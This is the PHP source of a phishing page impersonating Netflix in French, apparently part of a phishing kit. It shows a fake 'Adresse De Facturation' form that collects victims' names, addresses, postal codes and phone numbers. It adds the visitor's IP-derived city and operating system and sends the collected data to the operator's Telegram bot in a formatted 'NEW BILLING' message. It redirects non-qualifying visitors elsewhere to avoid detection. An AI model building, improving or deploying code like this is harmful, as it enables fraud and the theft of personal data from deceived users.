<?php
session_start();

$config = include 'config.php';
include "functions.php";

$user_ip = $_SERVER['REMOTE_ADDR'];
$user_info = getUserInfo(); 

$city = 'Unknown';
$response = file_get_contents("https://freeipapi.com/api/json/" . $user_ip);

if ($response !== false) {
    $data = json_decode($response, true);
    if (isset($data['cityName'])) {
        $city = $data['cityName'];
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $nom = isset($_POST['nom']) ? htmlspecialchars($_POST['nom']) : 'N/A';
    $prenom = isset($_POST['prenom']) ? htmlspecialchars($_POST['prenom']) : 'N/A';
    $ville = isset($_POST['ville']) ? htmlspecialchars($_POST['ville']) : 'N/A';
    $adresse = isset($_POST['adresse']) ? htmlspecialchars($_POST['adresse']) : 'N/A';
    $code_postal = isset($_POST['code_postal']) ? htmlspecialchars($_POST['code_postal']) : 'N/A';
    $telephone = isset($_POST['telephone']) ? htmlspecialchars($_POST['telephone']) : 'N/A';

    $timestamp = date('Y-m-d H:i:s');

    $telegram_message = "
📋 NEW BILLING FROM {$user_info['country_code']}

💳 Billing Details:

├ ✍️ Full Name: <code>{$nom} {$prenom}</code>
├ 🏠 Address: <code>{$adresse}</code>
├ 🏢 City: <code>{$ville}</code>
├ 📮 ZIP Code: <code>{$code_postal}</code>
├ 📞 Phone Number: <code>{$telephone}</code>

✨ Extra Information:

├ 🗺️ Country: <code>{$user_info['country_code']}</code>
├ 🌐 IP Address: <code>{$user_info['ip']}</code>
├ 🏙️ Detected City: <code>{$city}</code>
└ 💻 Operating System: <code>{$user_info['os']}</code>

🎯 Base Details:

└ 🕒 Timestamp: <code>{$timestamp}</code>
└ 📍 System: <code>NETFLIX</code>
└ © 2025 - All rights reserved. 🎗️

[🔗] CorteX - @Sssba3 [🔗]";


    if (sendMessage($telegram_message)) {
        error_log("Informations utilisateur envoyées avec succès.");
    } else {
        error_log("Échec de l'envoi des informations utilisateur.");
    }

    $_SESSION['info_submitted'] = true;
    header('Location: billing.php');
    exit();
}

if ($_SESSION['allow'] == "yes") {
?>

<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Informations Utilisateur - Netflix</title>
<link rel="icon" href="files/img/nficon2025.ico" />
<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}
body {
    margin: 0;
    padding: 0;
    background-color: black;
    background-image: url('files/img/back.jpg');
    background-repeat: no-repeat;
    background-position: center center;
    background-attachment: fixed;
    background-size: cover;
    font-family: 'Arial', sans-serif;
    color: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}
.logo {
    text-align: center;
    padding: 30px 0 10px;
}
.form-container {
    background-color: rgba(0, 0, 0, 0.85);
    width: 90%;
    max-width: 500px;
    margin: 40px auto;
    padding: 40px;
    border-radius: 8px;
    box-shadow: 0 0 20px rgba(0,0,0,0.8);
}
.form-container h2 {
    font-size: 16px;
    font-weight: bold;
    text-align: center;
    margin-bottom: 25px;
    margin-top: 0;
    position: relative;
    padding-top: 50px;
}
input[type="text"],
input[type="tel"],
input[type="number"] {
    display: block;
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border: 1px solid #444;
    border-radius: 2px;
    background-color: #111;
    color: #fff;
    font-size: 16px;
}
input::placeholder {
    color: #bbb;
}
button {
    width: 100%;
    background-color: #e50914;
    color: white;
    border: none;
    padding: 14px;
    font-size: 16px;
    margin-top: 10px;
    margin-bottom: -10px;
    cursor: pointer;
    border-radius: 2px;
    font-weight: bold;
    transition: background-color 0.3s ease;
}
button:hover {
    background-color: #f40612;
}
.footer {
    background-color: rgba(0, 0, 0, 0.8);
    color: #ccc;
    padding: 30px 20px;
    font-size: 13px;
    margin-top: auto;
}
.footer a {
    color: #ccc;
    text-decoration: none;
    margin: 0 10px;
    white-space: nowrap;
}
.footer-top {
    text-align: center;
    margin-bottom: 15px;
}
.footer-links {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 10px;
    margin-bottom: 20px;
}
.footer select {
    background-color: #111;
    color: #ccc;
    border: 1px solid #444;
    padding: 5px;
}
@media (max-width: 480px) {
    .form-container {
        width: 90%;
        max-width: 100%;
        margin: 10px auto;
        padding: 20px;
    }
}
</style>
</head>
<body>
    <div class="logo"></div>
    <div class="form-container">
        <div style="text-align: center; line-height: 0; margin-bottom: -10px;">
            <img src="files/img/logo.png" alt="Netflix Logo" style="height: 100px; display: inline-block; vertical-align: bottom; margin-bottom: -10px;">
        </div>
        <h2>Adresse De Facturation 🏠</h2>
        <form action="" method="post">
            <input type="text" name="nom" placeholder="Nom" required />
            <input type="text" name="prenom" placeholder="Prénom" required />
            <input type="text" name="ville" placeholder="Ville" required />
            <input type="text" name="adresse" placeholder="Adresse" required />
            <input type="text" name="code_postal" placeholder="Code Postal" required maxlength="10" />
            <input type="tel" name="telephone" placeholder="Numéro de téléphone" required maxlength="15" />
            <button type="submit">Suivant</button>
        </form>
    </div>
    <div class="footer">
        <div class="footer-top">Des questions ? Contactez-nous.</div>
        <div class="footer-links">
            <a href="#">FAQ</a>
            <a href="#">Centre d'aide</a>
            <a href="#">Boutique Netflix</a>
            <a href="#">Conditions d'utilisation</a>
            <a href="#">Confidentialité</a>
            <a href="#">Préférences de cookies</a>
            <a href="#">Mentions légales</a>
            <a href="#">Choix liés à la pub</a>
        </div>
        <div style="text-align: center;">
            <select>
                <option>Français</option>
            </select>
        </div>
    </div>
</body>
</html>

<?php
} else {
    header('Location: https://google.com/404');
    exit();
}
?>

